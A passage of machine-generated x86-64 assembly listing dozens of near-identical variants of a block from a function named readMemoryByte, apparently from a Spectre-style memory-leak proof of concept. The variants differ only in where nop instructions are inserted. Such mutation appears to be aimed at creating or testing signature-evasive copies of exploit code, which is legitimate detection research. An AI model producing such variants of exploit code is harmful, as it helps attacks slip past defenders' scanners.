	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 51
.LreadMemoryByte_win1_var51:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 52
.LreadMemoryByte_win1_var52:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 53
.LreadMemoryByte_win1_var53:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 54
.LreadMemoryByte_win1_var54:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 55
.LreadMemoryByte_win1_var55:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 56
.LreadMemoryByte_win1_var56:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 57
.LreadMemoryByte_win1_var57:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 58
.LreadMemoryByte_win1_var58:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 59
.LreadMemoryByte_win1_var59:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 60
.LreadMemoryByte_win1_var60:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 61
.LreadMemoryByte_win1_var61:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 62
.LreadMemoryByte_win1_var62:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 63
.LreadMemoryByte_win1_var63:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 64
.LreadMemoryByte_win1_var64:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 65
.LreadMemoryByte_win1_var65:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 66
.LreadMemoryByte_win1_var66:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 67
.LreadMemoryByte_win1_var67:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 68
.LreadMemoryByte_win1_var68:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 69
.LreadMemoryByte_win1_var69:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 70
.LreadMemoryByte_win1_var70:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 71
.LreadMemoryByte_win1_var71:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 72
.LreadMemoryByte_win1_var72:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 73
.LreadMemoryByte_win1_var73:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 74
.LreadMemoryByte_win1_var74:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 75
.LreadMemoryByte_win1_var75:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 76
.LreadMemoryByte_win1_var76:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 77
.LreadMemoryByte_win1_var77:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 78
.LreadMemoryByte_win1_var78:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 79
.LreadMemoryByte_win1_var79:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 80
.LreadMemoryByte_win1_var80:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 81
.LreadMemoryByte_win1_var81:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 82
.LreadMemoryByte_win1_var82:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 83
.LreadMemoryByte_win1_var83:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 84
.LreadMemoryByte_win1_var84:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 85
.LreadMemoryByte_win1_var85:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 86
.LreadMemoryByte_win1_var86:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 87
.LreadMemoryByte_win1_var87:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 88
.LreadMemoryByte_win1_var88:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 89
.LreadMemoryByte_win1_var89:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 90
.LreadMemoryByte_win1_var90:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 91
.LreadMemoryByte_win1_var91:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 92
.LreadMemoryByte_win1_var92:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 93
.LreadMemoryByte_win1_var93:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 94
.LreadMemoryByte_win1_var94:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 95
.LreadMemoryByte_win1_var95:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 96
.LreadMemoryByte_win1_var96:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 97
.LreadMemoryByte_win1_var97:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 98
.LreadMemoryByte_win1_var98:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 99
.LreadMemoryByte_win1_var99:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 100
.LreadMemoryByte_win1_var100:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	nop
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 101
.LreadMemoryByte_win1_var101:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 102
.LreadMemoryByte_win1_var102:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 103
.LreadMemoryByte_win1_var103:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 104
.LreadMemoryByte_win1_var104:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 105
.LreadMemoryByte_win1_var105:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 106
.LreadMemoryByte_win1_var106:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	nop
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 107
.LreadMemoryByte_win1_var107:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	nop
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 108
.LreadMemoryByte_win1_var108:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 109
.LreadMemoryByte_win1_var109:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 110
.LreadMemoryByte_win1_var110:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 111
.LreadMemoryByte_win1_var111:
	popq	%rax
	nop
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 112
.LreadMemoryByte_win1_var112:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	nop
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 113
.LreadMemoryByte_win1_var113:
	popq	%rax
	cmpl	$0, -64(%rbp)
	nop
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 114
.LreadMemoryByte_win1_var114:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
	nop
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	nop
	nop
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	jmp	.LreadMemoryByte_win1_continue
## Variant 115
.LreadMemoryByte_win1_var115:
	popq	%rax
	cmpl	$0, -64(%rbp)
	jl	LBB1_32
## %bb.31:                              ##   in Loop: Header=BB1_26 Depth=2
	movslq	-56(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %eax
	movslq	-64(%rbp), %rdx
	leaq	_readMemoryByte.results(%rip), %rcx
	nop
	jmp	.LreadMemoryByte_win1_continue
## Variant 116
